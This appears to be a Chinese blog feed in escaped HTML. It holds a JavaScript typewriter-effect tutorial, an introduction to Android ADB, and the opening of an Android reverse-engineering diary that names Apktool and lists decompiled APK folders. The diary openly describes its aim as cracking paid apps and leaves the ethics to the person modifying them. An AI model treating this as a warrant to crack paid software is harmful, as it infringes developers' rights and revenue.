&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_1&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_1&#34;&gt; 控制打字速度&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_2&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_2&#34;&gt; 纯 JS 实现&lt;/label&gt;&lt;/li&gt;
&lt;li class=&#34;task-list-item&#34;&gt;&lt;input type=&#34;checkbox&#34; id=&#34;cbx_3&#34; checked=&#34;true&#34; disabled=&#34;true&#34; /&gt;&lt;label for=&#34;cbx_3&#34;&gt; 适用于网页美化&lt;br /&gt;
效果如下&lt;/label&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;javascript教程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#javascript教程&#34;&gt;#&lt;/a&gt;  &lt;code&gt;JavaScript&lt;/code&gt;  教程&lt;/h1&gt;
&lt;p&gt;首先这个效果的核心是 &lt;code&gt;setTimeout()&lt;/code&gt;  方法和 &lt;code&gt;slice()&lt;/code&gt;  方法&lt;br /&gt;
这两个 JS 方法的用途分别是每隔一段时间执行一次代码和截取固定长度的字符串&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;span&gt;setTimeout的用法&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;执行代码&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;执行时间&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;span&gt;slice()的用法&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;对象&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;slice&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;截取起始&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;截取末尾&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;接下来只需要把效果拼接一下就可以了&lt;br /&gt;
使用 length () 取得文本长度&lt;br /&gt;
如果没到达文本总长度就逐增截取字符并显示&lt;br /&gt;
达到了文本长度就逐减截取字符并显示&lt;br /&gt;
下面给出 JavaScript 实例&lt;br /&gt;
&lt;span class=&#34;spoiler&#34; title=&#34;你知道得太多了&#34;&gt;这些只是旁白自己随手写的，可能代码有些粗糙，有实力的大佬可以自行修改&lt;/span&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight js&#34;&gt;&lt;figcaption data-lang=&#34;JavaScript&#34;&gt;&lt;span&gt;打字机实例&lt;/span&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; i &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;timer &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;str&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;// 申明将用到的变量，并初始化&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; divTyping &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; document&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getElementById&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;text&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 获得文本元素，你需要在 html 里添加一个带 id 的文本元素                                            // 如 &amp;lt;h1 id=&#34;text&#34;&gt;&amp;lt;/h1&gt;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;typing&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;时间虽短 情谊长存&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;13&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;苟富贵无相忘&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;14&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;      &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;15&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;16&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;str &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;No matter where \nWe called home&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;17&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;18&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;19&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 如果你要循环打出不同的几段话，就使用上面这个函数&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;20&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 如果你只想要一段话重复打字，直接设置 str 变量的值即可。&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;21&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;22&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;&amp;lt;=&lt;/span&gt; str&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;length&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; divTyping&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;innerHTML &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; str&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;slice&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; i&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; timer &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;typing&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;300&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 如果长度未到达，就逐步增字&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// &#39;_&#39; 为光标符号，可以换成 &#39;|&#39;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 如果长度到达，结束打字，移除打字机，并启动扣字机&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;clearTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;timer&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;typin&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 这里是扣字机&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;typin&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;i &lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; divTyping&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;innerHTML &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; str&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;slice&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;i&lt;span class=&#34;token operator&#34;&gt;--&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;_&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; timez &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;setTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;typin&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 如果文本长度不为 0 就逐步扣字&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token keyword&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;	&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 如果文本长度为 0 就结束扣字机，开启打字机&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;clearTimeout&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;timez&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;typing&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;s &lt;span class=&#34;token operator&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; s &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token comment&#34;&gt;// 控制循环打字&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; s&lt;span class=&#34;token operator&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;54&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;55&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;复制粘贴即可食用&lt;br /&gt;
 &lt;code&gt;本文来自旁白&lt;/code&gt; &lt;br /&gt;
转载请注明原地址&lt;/p&gt;

 &lt;p&gt;ADB 全称 Android Debug Bridgde&lt;br /&gt;
 是安卓手机自带的供开发者使用的调试工具。这个工具可以直接操作管理 android 模拟器或者真实的 andriod 设备&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;p&gt;adb 的主要功能如下&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;在 Android 设备上运行 Shell (命令行)&lt;/li&gt;
&lt;li&gt;管理模拟器或设备的端口映射&lt;/li&gt;
&lt;li&gt;在计算机和设备之间上传 / 下载文件&lt;/li&gt;
&lt;li&gt;将电脑上的本地 APK 软件安装至 Android 模拟器或设备上&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;有人说 adb 只是用来调试的，对于一般人来说没有太大用处，&lt;br /&gt;
但其实并非如此，在安卓手机中它的权限仅次于 &#39;Root&#39;&lt;br /&gt;
 以至于在安卓中，每一次重启过后，大多 adb 的功能都会失效 (避免手机不稳定)。&lt;br /&gt;
通过 adb 执行 shell 能使手机获得很多功能，这也给了手机应用开发者搞事情的空间，&lt;br /&gt;
通过获得 adb 权限&lt;br /&gt;
 icebox，权限狗，黑域，可以通过 adb 权限对手机应用进行管理 (这里说的手机应用包括系统应用)，控制他们的自启行为，和一些流氓权限。&lt;br /&gt;
同时 adb 可以触及到一些手机设置里没有的选项，如安卓 8 的自由窗口模式，一些软件设备管理员权限的激活。&lt;br /&gt;
感觉手机更像是自己的了。&lt;/p&gt;

 &lt;p&gt;有关于安卓逆向的一篇日记，如何二改＆破解软件？来看看这篇很勉强的技术博客吧。&lt;/p&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;p&gt;关于安卓逆向，大部分的作用都是用于破解软件 (一些付费的软件)，另外的就是二改软件 (软件汉化，反人类的操作修改)，当然这里面或多或少是涉及到软件提供商的利益问题的，一切利弊由修改者衡量。&lt;br /&gt;
这篇文章本人的入坑笔记，因为是小白，一些见解可能不太正确，如果你也有一点见解，可以在本页评论交流。&lt;/p&gt;
&lt;p&gt;注：可能需要一些安卓开发基础知识，可以自行百度&lt;br /&gt;
 &lt;code&gt;本文由@PangBai原创，转载请注明原地址&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;安卓安卓包&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安卓安卓包&#34;&gt;#&lt;/a&gt; 安卓安卓包&lt;/h2&gt;
&lt;h3 id=&#34;目录结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#目录结构&#34;&gt;#&lt;/a&gt; 目录结构&lt;/h3&gt;
&lt;p&gt;关于安卓安装包，大部分是以 &lt;code&gt;.apk&lt;/code&gt;  为后缀，当然，也有.apks 和.abb, 解压后查看目录大致也相差不大。&lt;/p&gt;
&lt;p&gt;apk 文件中有许多已编译的文件 (字节码形式)，这些我们自然看不懂&lt;br /&gt;
如 AndroidManifest.xml，classes.dex，resources.arsc&lt;br /&gt;
 既然看不懂，我们就得找翻译吧，使用工具&lt;strong&gt; Apktool&lt;/strong&gt; 进行反编译，手机上请用&lt;strong&gt; Apktool_M&lt;/strong&gt; （你一定要用 MT 我也没办法）&lt;/p&gt;
&lt;p&gt;以下为反编译后目录内容 (也许会出现其他文件夹，但大多与逆向不会有太大关系)&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;assets&lt;/li&gt;
&lt;li&gt;lib&lt;/li&gt;
&lt;li&gt;smali&lt;/li&gt;
&lt;li&gt;res&lt;/li&gt;
&lt;li&gt;layout&lt;/li&gt;
&lt;li&gt;color&lt;/li&gt;
&lt;li&gt;anim&lt;/li&gt;
&lt;li&gt;drawable&lt;/li&gt;
&lt;li&gt;raw&lt;/li&gt;
&lt;li&gt;xml&lt;/li&gt;
&lt;/ul&gt;
